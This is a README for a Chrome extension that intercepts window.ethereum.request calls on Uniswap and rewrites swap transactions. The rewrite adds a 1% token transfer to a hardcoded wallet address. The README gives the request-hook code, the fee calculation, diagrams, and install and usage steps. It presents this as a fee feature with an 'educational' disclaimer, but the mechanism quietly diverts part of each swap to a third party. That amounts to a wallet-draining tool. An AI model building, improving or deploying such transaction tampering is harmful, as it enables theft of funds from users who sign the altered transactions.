# Uniswap V4 Fee Injection Extension

A Chrome extension that automatically injects 1% fees into Uniswap V4 Universal Router transactions by intercepting and modifying `window.ethereum.request()` calls.

## 🎯 Overview

This extension monitors Ethereum transactions on Uniswap and automatically adds a 1% fee collection to swaps. It works by:

1. **Intercepting** `window.ethereum.request()` calls
2. **Detecting** Uniswap Universal Router transactions
3. **Parsing** complex multicall transaction data
4. **Converting** multicall format to execute format
5. **Injecting** additional TRANSFER command for fee collection
6. **Preserving** all original swap logic

## 🔧 How It Works

### Transaction Interception Flow

```mermaid
graph TD
    A["User Initiates Swap"] --> B["Uniswap UI Creates Transaction"]
    B --> C["window.ethereum.request Called"]
    C --> D["Extension Intercepts Request"]
    D --> E{"Is Universal Router?"}
    E -->|No| F["Pass Through Original"]
    E -->|Yes| G["Extract Swap Information"]
    G --> H{"Successfully Parsed?"}
    H -->|No| I["Return Original Transaction"]
    H -->|Yes| J["Calculate 1% Fee"]
    J --> K["Convert to Execute Format"]
    K --> L["Add Fee Transfer Command"]
    L --> M["Return Modified Transaction"]
    M --> N["MetaMask Shows Transaction"]
    N --> O["User Confirms & Executes"]
```

### Transaction Conversion Process

```mermaid
graph LR
    A["0x3593564c Multicall"] --> B["Parse Multicall Data"]
    B --> C["Extract Individual Calls"]
    C --> D["Map to Execute Commands"]
    D --> E["Add Fee Transfer"]
    E --> F["0x24856bc3 Execute"]

    subgraph "Original Format"
        G["multicall(uint256 deadline, bytes calldata data)"]
    end

    subgraph "Target Format"
        H["execute(bytes commands, bytes inputs)"]
    end

    A --> G
    F --> H
```

## 📊 Data Structure Schemas

### Multicall Transaction Schema

```mermaid
graph TB
    A["Multicall Transaction"] --> B["Function Signature: 0x3593564c"]
    A --> C["Parameters"]
    C --> D["Deadline uint256"]
    C --> E["Call Data Array"]
    E --> F["Call 1: exactInputSingle"]
    E --> G["Call 2: unwrapWETH9"]
    E --> H["Call 3: sweepToken"]

    F --> I["Function Sig: 0x414bf389"]
    F --> J["Swap Parameters"]

    G --> K["Function Sig: 0x49404b7c"]
    G --> L["Unwrap Parameters"]

    H --> M["Function Sig: 0xdf2ab5bb"]
    H --> N["Sweep Parameters"]
```

### Execute Transaction Schema

```mermaid
graph TB
    A["Execute Transaction"] --> B["Function Signature: 0x24856bc3"]
    A --> C["Parameters"]
    C --> D["Commands bytes"]
    C --> E["Inputs Array"]

    D --> F["Command 1: 0x00 V3_SWAP_EXACT_IN"]
    D --> G["Command 2: 0x0c UNWRAP_WETH"]
    D --> H["Command 3: 0x04 SWEEP"]
    D --> I["Command 4: 0x0a TRANSFER Fee"]

    E --> J["Input 1: Swap Data"]
    E --> K["Input 2: Unwrap Data"]
    E --> L["Input 3: Sweep Data"]
    E --> M["Input 4: Fee Transfer Data"]
```

## 🔄 Function Signature Mapping

The extension maps multicall function signatures to execute commands:

```mermaid
graph LR
    A["0x414bf389<br/>exactInputSingle"] --> B["0x00<br/>V3_SWAP_EXACT_IN"]
    C["0xc04b8d59<br/>exactInput"] --> D["0x00<br/>V3_SWAP_EXACT_IN"]
    E["0x49404b7c<br/>unwrapWETH9"] --> F["0x0c<br/>UNWRAP_WETH"]
    G["0xdf2ab5bb<br/>sweepToken"] --> H["0x04<br/>SWEEP"]
    I["Fee Injection"] --> J["0x0a<br/>TRANSFER"]
```

## 🎛️ Extension Architecture

### Component Overview

```mermaid
graph TB
    A["injector.js"] --> B["Main Interception Logic"]
    A --> C["Transaction Parsing"]
    A --> D["Fee Calculation"]
    A --> E["Format Conversion"]

    F["decode.js"] --> G["ABI Encoding/Decoding"]
    F --> H["Parameter Parsing"]
    F --> I["Data Validation"]

    J["utils.js"] --> K["Mathematical Operations"]
    J --> L["BigInt Handling"]
    J --> M["Fee Calculations"]

    B --> N["window.ethereum Hook"]
    C --> O["Multicall Parser"]
    E --> P["Execute Builder"]
```

### Interception Mechanism

```mermaid
sequenceDiagram
    participant U as User
    participant UI as Uniswap UI
    participant E as Extension
    participant M as MetaMask
    participant B as Blockchain

    U->>UI: Initiate Swap
    UI->>E: window.ethereum.request()
    E->>E: Detect Universal Router
    E->>E: Parse Transaction Data
    E->>E: Calculate 1% Fee
    E->>E: Convert to Execute Format
    E->>E: Add Fee Transfer
    E->>M: Modified Transaction
    M->>U: Show Transaction Preview
    U->>M: Confirm Transaction
    M->>B: Execute Transaction
    B->>B: Process Swap + Fee
```

## 📋 Technical Implementation

### Key Functions

#### 1. Transaction Interception

```javascript
// Hooks into window.ethereum.request
window.ethereum.request = async function (args) {
  if (args.method === "eth_sendTransaction") {
    // Intercept and modify transaction
    return interceptEthereumRequest(args);
  }
  return originalRequest.call(this, args);
};
```

#### 2. Multicall Parsing

```javascript
// Parses multicall(uint256 deadline, bytes[] calldata data)
function parseMulticallData(dataHex) {
  // Extract deadline
  // Parse bytes[] array offsets
  // Read individual call data
  // Return structured data
}
```

#### 3. Fee Calculation

```javascript
// Calculates 1% of swap amount
function calculateOnePercent(amount) {
  const amountBigInt = BigInt(amount);
  return (amountBigInt * BigInt(1)) / BigInt(100);
}
```

#### 4. Format Conversion

```javascript
// Converts multicall to execute format
function convertMulticallToExecuteWithFee(originalData, feeToken, feeAmount) {
  // Parse original multicall
  // Map functions to commands
  // Add fee transfer command
  // Build execute transaction
}
```

### Universal Router Addresses

```mermaid
graph TB
    A["Universal Router Detection"] --> B["Mainnet: 0x66a9893cc07d91d95644aedd05d03f95e1dba8af"]
    A --> C["Function Signatures"]
    C --> D["0x3593564c - multicall"]
    C --> E["0x24856bc3 - execute"]
```

## 🎯 Fee Collection Details

### Fee Structure

- **Amount**: 1% of the swap amount
- **Token**: Same token being swapped out (e.g., USDT in ETH→USDT swap)
- **Recipient**: `0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed`
- **Method**: TRANSFER command (0x0a) in Universal Router

### Fee Calculation Flow

```mermaid
graph LR
    A["Detect Swap Amount"] --> B["Parse Token Amount"]
    B --> C["Calculate 1%"]
    C --> D["Validate Amount > 0"]
    D --> E["Create Transfer Command"]
    E --> F["Add to Transaction"]

    G["Example: 1000 USDT"] --> H["Fee: 10 USDT"]
    H --> I["User gets: 990 USDT"]
    I --> J["Fee recipient gets: 10 USDT"]
```

## 🚀 Installation & Usage

### Development Setup

1. **Clone & Build**

```bash
git clone <repository>
cd middleware-extension/extension
./build.sh
```

2. **Chrome Extension**

```bash
# Open Chrome
chrome://extensions/
# Enable Developer Mode
# Click "Load unpacked"
# Select the extension folder
```

3. **Switch to Development Mode**

```bash
./switch-manifest.sh dev
```

### Production Usage

1. **Load Extension** in Chrome
2. **Visit** app.uniswap.org
3. **Execute** any swap transaction
4. **Check** console logs for fee injection confirmation

## 🔍 Debugging & Monitoring

### Console Logs

The extension provides detailed logging:

```
🎯 Intercepted Uniswap Universal Router transaction
🔧 Processing existing execute call
💰 Detected swap: ETH -> USDT (1000000000000000000 wei)
💸 Fee amount (1%): 10000000000000000 wei
✅ Fee injection successful
```

### Transaction Verification

```mermaid
graph TB
    A["Transaction Submitted"] --> B["Check Console Logs"]
    B --> C{"Fee Injection Success?"}
    C -->|Yes| D["Verify Fee Transfer in Transaction"]
    C -->|No| E["Check Error Messages"]
    D --> F["Monitor Recipient Address"]
    E --> G["Debug Transaction Format"]
```

## 🔒 Security Considerations

### Safety Measures

- **Read-only** transaction modification
- **Preserves** all original swap logic
- **Validates** transaction format before modification
- **Fallback** to original transaction if parsing fails

### Privacy

- **No data collection** or external API calls
- **Local processing** only
- **No user tracking** or analytics

## 📈 Performance Impact

### Metrics

- **Processing time**: ~2-5ms per transaction
- **Memory usage**: Minimal (extension scripts)
- **Network impact**: None (no external requests)

### Optimization

- **Lazy loading** of parsing functions
- **Efficient** BigInt operations
- **Minimal** DOM manipulation

## 🛠️ Development Notes

### File Structure

```
extension/
├── manifest.json          # Extension configuration
├── injector.js           # Main interception logic
├── decode.js             # ABI encoding/decoding
├── utils.js              # Mathematical utilities
├── test-page.html        # Testing interface
└── README.md             # This documentation
```

### Build Process

```mermaid
graph LR
    A["Source Files"] --> B["Syntax Validation"]
    B --> C["File Size Check"]
    C --> D["Package Creation"]
    D --> E["Distribution ZIP"]
```

## 📚 Resources

- [Uniswap V4 Documentation](https://docs.uniswap.org/contracts/v4/overview)
- [Universal Router Contract](https://github.com/Uniswap/universal-router)
- [Chrome Extension Development](https://developer.chrome.com/docs/extensions/)
- [Ethereum JSON-RPC API](https://ethereum.org/en/developers/docs/apis/json-rpc/)

---

**⚠️ Disclaimer**: This extension is for educational and development purposes. Use at your own risk. Always verify transaction details before confirming in MetaMask.
